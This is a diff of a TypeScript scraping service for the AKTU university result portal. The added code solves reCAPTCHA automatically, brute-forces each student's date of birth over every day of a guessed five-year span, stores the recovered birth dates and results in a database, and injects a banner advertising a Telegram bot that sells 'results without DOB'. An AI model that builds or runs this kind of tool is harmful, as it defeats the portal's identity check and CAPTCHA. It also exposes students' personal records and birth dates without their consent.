@@ -2,6 +2,7 @@ import qs from 'qs';
 import * as cheerio from 'cheerio';
 import { AKTU_URL, getRandomHeaders } from '../config';
 import { ViewStateParams, ParseResult, Student, ScrapingSession } from '../interfaces';
+import { DateUtils } from '../utils/date.utils';
 
 function getSetCookieHeaders(response: Response): string[] {
   if (typeof (response.headers as any).getSetCookie === 'function') {
@@ -89,8 +90,8 @@ export class ScrapingService {
         },
         body: data
       });
-      console.log(response)
       const htmlData = await response.text();
+      const captchaFailed = htmlData.includes('कैप्चा गलत है') || htmlData.includes('प्रदान कैप्चा गलत है');
 
       const parsed = ScrapingService.parseHtml(htmlData);
       const viewStateParams = await ScrapingService.extractViewStateParams(htmlData);
@@ -115,7 +116,8 @@ export class ScrapingService {
         nextSession: {
           cookieHeader: updatedCookieHeader,
           viewStateParams
-        }
+        },
+        captchaFailed
       };
     } catch (error) {
       console.error('Error in find function:', error);
@@ -510,8 +512,7 @@ export class ScrapingService {
         'btnProceed': 'आगे बढ़े',
         '__VIEWSTATE': initialParams.viewState,
         '__VIEWSTATEGENERATOR': initialParams.viewStateGenerator,
-        '__EVENTVALIDATION': initialParams.eventValidation,
-        'g-recaptcha-response': gRecaptchaResponse
+        '__EVENTVALIDATION': initialParams.eventValidation
       });
 
       const proceedRes = await fetch(AKTU_URL, {
@@ -555,6 +556,7 @@ export class ScrapingService {
         '__VIEWSTATE': targetViewState,
         '__VIEWSTATEGENERATOR': targetViewStateGen,
         '__EVENTVALIDATION': targetEventVal,
+        'hidForModel': '',
         'g-recaptcha-response': gRecaptchaResponse
       });
 
@@ -582,7 +584,6 @@ export class ScrapingService {
       }
 
       if (targetHtml.includes('कैप्चा गलत है')) {
-        console.log(targetHtml)
         console.warn(`[Bypass] AKTU server requested reCAPTCHA validation for roll number: ${rollNumber}`);
       } else {
         console.log(`[Bypass] Parse failed for roll number: ${rollNumber}. HTML status: ${targetRes.status}, HTML length: ${targetHtml.length}`);
@@ -590,6 +591,195 @@ export class ScrapingService {
       return null;
     } catch (error: any) {
       console.error('[Bypass] Error in bypass flow:', error.message);
+      return null;
+    }
+  }
+
+  static async fetchResultWithDob(rollNumber: string, dob: string, gRecaptchaResponse = ''): Promise<Student | null> {
+    const headers = getRandomHeaders();
+    try {
+      console.log(`[Result] Fetching result for roll ${rollNumber} with DOB ${dob}...`);
+      const validationSession = await ScrapingService.validateRollNumber(rollNumber, true);
+      if (!validationSession || typeof validationSession !== 'object' || !('cookieHeader' in validationSession)) {
+        console.error('[Result] Failed to validate roll number and obtain session');
+        return null;
+      }
+
+      const session = validationSession as ScrapingSession;
+
+      let solvedCaptcha = gRecaptchaResponse;
+      if (!solvedCaptcha) {
+        try {
+          const { CaptchaService } = await import('../services/captcha.service');
+          const token = await CaptchaService.solveRecaptchaV2();
+          if (token) solvedCaptcha = token;
+        } catch (e: any) {
+          console.warn('[ScrapingService] Automated captcha solving skipped:', e.message);
+        }
+      }
+
+      const targetData = qs.stringify({
+        '__EVENTTARGET': '',
+        '__EVENTARGUMENT': '',
+        'txtRollNo': rollNumber,
+        'txtDOB': dob,
+        'btnSearch': 'खोजें',
+        '__VIEWSTATE': session.viewStateParams.viewState,
+        '__VIEWSTATEGENERATOR': session.viewStateParams.viewStateGenerator,
+        '__EVENTVALIDATION': session.viewStateParams.eventValidation,
+        'hidForModel': '',
+        'g-recaptcha-response': solvedCaptcha
+      });
+
+      const targetRes = await fetch(AKTU_URL, {
+        method: 'POST',
+        headers: {
+          ...headers,
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Cookie': session.cookieHeader
+        },
+        body: targetData
+      });
+      const targetHtml = await targetRes.text();
+
+      // Create pre-expanded full page where every single semester accordion is opened
+      let expandedFullHtml = targetHtml;
+      if (expandedFullHtml.includes('</head>')) {
+        expandedFullHtml = expandedFullHtml.replace(
+          '</head>',
+          `<style>
+            .contentclass { display: block !important; visibility: visible !important; height: auto !important; max-height: none !important; opacity: 1 !important; }
+            .headerclass { background-color: #7A1C1C !important; color: white !important; cursor: pointer; padding: 10px 14px; margin-top: 15px; border-radius: 4px; font-weight: bold; }
+            .headerclass a, .headerclass span { color: white !important; }
+            body { padding: 15px; background: #f7fafc; }
+          </style>
+          <script>
+            window.addEventListener('DOMContentLoaded', () => {
+              document.querySelectorAll('.contentclass').forEach(el => {
+                el.style.display = 'block';
+                el.style.visibility = 'visible';
+              });
+            });
+          </script>
+          </head>`
+        );
+      }
+
+      if (expandedFullHtml.includes('<body')) {
+        expandedFullHtml = expandedFullHtml.replace(
+          /<body([^>]*)>/i,
+          `<body$1>
+          <div style="background: linear-gradient(135deg, #7A1C1C, #991B1B); color: #ffffff; padding: 12px 18px; text-align: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 14px; position: sticky; top: 0; z-index: 9999999; box-shadow: 0 4px 15px rgba(0,0,0,0.25); border-bottom: 2px solid #FFD700;">
+            <span>🔥 <b>Want your AKTU Result without DOB?</b></span>
+            <a href="https://t.me/akturesultwithoutdobbot" target="_blank" style="display: inline-block; background: #FFD700; color: #7A1C1C; padding: 6px 18px; border-radius: 20px; text-decoration: none; margin-left: 12px; font-weight: 800; box-shadow: 0 2px 6px rgba(0,0,0,0.2);">👉 Click here to continue</a>
+          </div>`
+        );
+      }
+
+      const parseResult = ScrapingService.parseHtml(targetHtml);
+      if (parseResult) {
+        const studentResult: Student = {
+          ...parseResult,
+          dob: dob,
+          rawHtml: expandedFullHtml
+        };
+        await ScrapingService.safeSaveToDatabase(studentResult);
+        console.log(`[Result] Successfully fetched and cached result for roll number: ${rollNumber}`);
+        return studentResult;
+      }
+
+      if (targetHtml.includes('कैप्चा गलत है')) {
+        console.warn(`[Result] Captcha validation failed for roll: ${rollNumber}`);
+      } else if (targetHtml.includes('जन्मतिथि गलत है')) {
+        console.warn(`[Result] Incorrect DOB (${dob}) for roll: ${rollNumber}`);
+      } else {
+        console.warn(`[Result] Result parse failed for roll: ${rollNumber}. HTML status: ${targetRes.status}`);
+      }
+      return null;
+    } catch (error: any) {
+      console.error('[Result] Error fetching result with DOB:', error.message);
+      return null;
+    }
+  }
+
+  static async discoverDobAndFetchResult(
+    rollNumber: string,
+    gRecaptchaResponse = '',
+    startYear?: number,
+    endYear?: number
+  ): Promise<Student | null> {
+    try {
+      console.log(`[DOB Discover] Starting DOB discovery for roll ${rollNumber}...`);
+      const validationSession = await ScrapingService.validateRollNumber(rollNumber, true);
+      if (!validationSession || typeof validationSession !== 'object' || !('cookieHeader' in validationSession)) {
+        console.error('[DOB Discover] Failed to validate roll number and obtain session');
+        return null;
+      }
+
+      let currentSession = validationSession as ScrapingSession;
+
+      // Smart year inference based on roll number prefix
+      let estAdmissionYear = 2022;
+      const prefixTwo = parseInt(rollNumber.substring(0, 2), 10);
+      if (!isNaN(prefixTwo) && prefixTwo >= 10 && prefixTwo <= 30) {
+        estAdmissionYear = 2000 + prefixTwo;
+      }
+      const typicalBirthYear = estAdmissionYear - 18; // e.g. 2021 - 18 = 2003
+
+      const yearsToSearch: number[] = [];
+      if (startYear && endYear && startYear <= endYear) {
+        for (let y = startYear; y <= endYear; y++) yearsToSearch.push(y);
+      } else {
+        yearsToSearch.push(typicalBirthYear);      // e.g. 2003
+        yearsToSearch.push(typicalBirthYear - 1);  // e.g. 2002
+        yearsToSearch.push(typicalBirthYear + 1);  // e.g. 2004
+        yearsToSearch.push(typicalBirthYear - 2);  // e.g. 2001
+        yearsToSearch.push(typicalBirthYear + 2);  // e.g. 2005
+      }
+
+      let isFirstAttempt = true;
+
+      for (const year of yearsToSearch) {
+        for (let month = 1; month <= 12; month++) {
+          const daysInMonth = DateUtils.getDaysInMonth(month, year);
+          for (let day = 1; day <= daysInMonth; day++) {
+            const tokenToUse = isFirstAttempt ? gRecaptchaResponse : '';
+            console.log(`[DOB Discover] Testing DOB: ${day}/${month}/${year} for roll ${rollNumber}`);
+            const findResult = await ScrapingService.find(rollNumber, day, month, year, currentSession, tokenToUse);
+
+            if (!findResult) {
+              console.warn(`[DOB Discover] Network error on ${day}/${month}/${year}`);
+              break;
+            }
+
+            // If captcha failed on subsequent attempt, AKTU requires per-request captcha
+            if (!isFirstAttempt && findResult.captchaFailed) {
+              console.warn(`[DOB Discover] AKTU requires per-request reCAPTCHA token. Ending discovery loop.`);
+              return null;
+            }
+
+            isFirstAttempt = false;
+
+            const { result: parseResult, nextSession } = findResult;
+            currentSession = nextSession;
+
+            if (parseResult) {
+              const foundDob = `${String(day).padStart(2, '0')}/${String(month).padStart(2, '0')}/${year}`;
+              console.log(`[DOB Discover] SUCCESS! Located DOB: ${foundDob} for ${rollNumber} (${parseResult.name})`);
+              const studentResult: Student = {
+                ...parseResult,
+                dob: foundDob
+              };
+              await ScrapingService.safeSaveToDatabase(studentResult);
+              return studentResult;
+            }
+          }
+        }
+      }
+
+      return null;
+    } catch (err: any) {
+      console.error('[DOB Discover] Error during DOB discovery:', err.message);
       return null;
     }
   }
